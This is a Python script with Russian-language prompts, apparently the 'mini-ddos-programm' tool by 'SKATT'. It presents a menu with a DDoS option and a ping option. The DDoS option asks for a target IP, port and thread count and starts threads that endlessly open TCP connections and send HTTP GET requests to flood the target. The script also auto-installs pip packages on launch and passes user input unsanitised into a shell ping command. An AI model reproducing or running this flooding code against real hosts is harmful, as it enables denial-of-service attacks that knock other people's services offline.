
#version 6.0
#by SKATT
import os
print('Установка дополнительных модулей...')
os.system('pip install --upgrade pip')
os.system('pip install requests')
os.system('pip install colorama')
os.system('pip install lib-platform')
print('Импортирую модули...')
import colorama
import sys
import platform
import socket
import requests
import threading
import time
from time import ctime
print('Импортирую цвета...')
from colorama import Fore
colorama.init()
print('Запуск программы...')
version = 'v6.0'
print(version)
print(Fore.GREEN + 'Created by SKATT')
print(Fore.BLUE + 'Проверяю соединение с интернетом')
try:
    requests.get("https://google.com", timeout=4)
    print('Проверка завершена успешно!')
except:
    print(
        f"{Fore.RED}[!] {Fore.MAGENTA}Вы не подключены к интернету \n пожалуйста проверте соединение с интернетом \n и запустите программу заново{Fore.RESET}"
    )
    sys.exit()
print(Fore.YELLOW + 'Проверка Обновлений')
VERSION_URL = 'https://api.github.com/repos/POHel/mini-ddos-programm/releases/latest'
DOWNLOAD_URL = 'https://github.com/POHel/mini-ddos-programm/archive/refs/heads/main.zip'

def update_program(owner, repo, file):
    response = requests.get(VERSION_URL.format(owner=owner, repo=repo)).json()
    latest_version = response['tag_name']

    if latest_version > version:
        print(Fore.MAGENTA + '[!]' + Fore.YELLOW + 'Доступно обновление')
        print(Fore.BLUE + 'Загружаю обновление')
        download_url = DOWNLOAD_URL.format(owner=owner, repo=repo, file=file)
        r = requests.get(download_url, allow_redirects=True)
        print(Fore.MAGENTA + '[!]' + Fore.GREEN + 'Обновление Загружено')

    if version >= latest_version:
        print(Fore.MAGENTA + '[!]' + Fore.GREEN + 'Установлена самая последняя версия')

if __name__ == '__main__':
    update_program('POHel', 'mini-ddos-programm', 'main.zip')

print(Fore.BLUE + 'Определяю OS...')
print('Ваша ос: ', os.name)
time.sleep(1)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
print(Fore.RED + '''

                     ▄█▀▀▀█▄████▀▀▀██▄   ▄▄█▀▀██▄  ▄█▀▀▀█▄█
                    ▄██    ▀█ ██    ▀██▄██▀    ▀██▄██    ▀█
                    ▀███▄     ██     ▀███▀      ▀█████▄
                      ▀█████▄ ██      ███        ██ ▀█████▄
                    ▄     ▀██ ██     ▄███▄      ▄██     ▀██
                    ██     ██ ██    ▄██▀██▄    ▄██▀█     ██
                    █▀█████▀▄████████▀   ▀▀████▀▀ █▀█████▀
                                Created by SKATT
''')
print(version)
print(f"""
    {Fore.RED}=== Python info:
    {Fore.GREEN}PYTHON VERSION: {platform.python_version()}
    {Fore.GREEN}SCRIPT LOCATION: {os.path.dirname(os.path.realpath(sys.argv[0]))}
    {Fore.GREEN}CURRENT LOCATION: {os.getcwd()}
    {Fore.RED}=== System info:
    {Fore.BLUE}SYSTEM: {platform.system()}
    {Fore.BLUE}RELEASE: {platform.release()}
    {Fore.BLUE}VERSION: {platform.version()}
    {Fore.BLUE}ARCHITECTURE: {'{} {}'.format(*platform.architecture())}
    {Fore.BLUE}PROCESSOR: {platform.processor()}
    {Fore.BLUE}MACHINE: {platform.machine()}
    {Fore.RESET}
""")
try:
    while True:
        print(f'''
        {Fore.MAGENTA}Выберите действие:
        {Fore.MAGENTA}[1] {Fore.BLUE}DDOS
        {Fore.MAGENTA}[2] {Fore.BLUE}ping
        ''')
        print(Fore.GREEN + '')
        number = (input('Введите цифру: '))
        if number == '1':
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
            target_ip = input(Fore.GREEN + 'введите IP: ')
            print(Fore.BLUE + 'Проверяю соединение с хостом')
            try:
                os.system(f'ping {target_ip}')
                print(f'\nПроверка завершена!{Fore.GREEN}')
            except:
                print(f'\n{Fore.RED}Не удалось связаться с хостом!{Fore.GREEN}\n')

            target_port = int(input('Введите порт: '))
            num_threads = int(input('Укажите поточность: '))
            timeout = bool(input('Укажите тайм-аут(обычно 0.5): '))

            # Счетчики запросов
            successful_requests = 0
            failed_requests = 0

            def send_requests():
                global successful_requests
                global failed_requests
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(timeout)                       
                        s.connect((target_ip, target_port))
                        # Отправляем пустой запрос HTTP
                        s.send(b"GET / HTTP/1.1\r\n\r\n")
                        successful_requests += 1
                        print("Всего отправлено успешных запросов:", successful_requests)
                        s.recv(1024)
                        s.close()
                    except socket.timeout:
                        failed_requests += 1
                        print("Всего отправлено неудачных запросов (тайм-аут):", failed_requests)
                    except:
                        failed_requests += 1
                        print("Всего отправлено неудачных запросов (тайм-аут):", failed_requests)                   
            threads = []
            for i in range(num_threads):
                t = threading.Thread(target=send_requests)
                threads.append(t)
            for t in threads:
                t.start()
            for t in threads:
                t.join(10)
            for t in threads:
                t.stop()

        elif number == '2':
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
            print(Fore.CYAN + '')
            print('starting ping...')
            piip = input('Введите ip: ')
            os.system('ping ' + piip)

        else:
            print(Fore.RED + 'Выбрано не верное число')

except KeyboardInterrupt:
    print(f"\n{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.BLUE}Exiting...")
    sys.exit()
